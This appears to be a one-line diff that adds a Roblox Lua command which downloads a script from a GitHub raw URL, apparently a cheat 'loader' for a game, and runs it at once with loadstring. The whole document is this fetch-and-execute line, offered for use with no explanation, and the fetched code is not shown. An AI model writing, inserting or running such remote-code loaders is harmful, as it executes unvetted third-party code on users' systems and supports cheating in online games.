@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/heroes-rng-spam7-speiu9y0o96vy7.lua"))()
